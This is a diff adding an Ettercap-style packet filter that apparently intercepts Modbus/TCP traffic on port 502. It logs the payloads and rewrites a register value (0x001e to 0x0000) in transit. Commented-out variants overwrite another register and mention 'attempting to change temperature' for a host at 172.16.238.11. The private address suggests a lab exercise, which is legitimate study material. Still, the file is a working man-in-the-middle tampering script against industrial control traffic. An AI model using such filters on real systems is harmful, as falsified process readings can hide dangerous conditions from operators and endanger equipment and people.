@@ -1,0 +1,46 @@
+# msg("Applying filter");
+
+if (tcp.src == 502) {
+     msg("Modbus packet sent");
+     log(DATA.data, "/tmp/logfile-sent.log");
+     if (DATA.data+29 == "\x00\x1e") {
+       DATA.data+29 = "\x00\x00";
+       msg("Data replaced");
+     }
+}
+
+# if (tcp.dst == 502) {
+#      msg("Modbus packet received");
+#      log(DATA.data, "/tmp/logfile-received.log");
+# }
+
+
+# if (tcp.src == 502) {
+#      msg("Modbus packet");
+#      if (DATA.data == "") {
+#             msg("Esta vacio");
+#      }
+# }
+
+# if (tcp.src == 502) {
+#    DATA.data + 15 = "\xca\xfe";
+#    msg("Data in register 3 replaced");
+# }
+
+# if (tcp.src == 502 && DATA.data+29 == "\x00\x1e") {
+#    DATA.data + 29 = "\x00\x00";
+#    msg("Data replaced");
+# }
+
+# if (ip.proto == TCP && ip.dst == '172.16.238.11' && tcp.src == 502) {
+#        msg("Detected message...");
+#        # log(DATA.data, "/tmp/logfile.log");
+#        # if (search(DATA.data, "\x1e\x00")) {
+#        #        msg("Attempting to change temperature...");
+#        #        if (replace("\x1e\x00", "\x00\x00")) {
+#        #               msg("Success");
+#        #           } else {
+#        #               msg("Failed");
+#        #           }
+#        #    }
+#    }
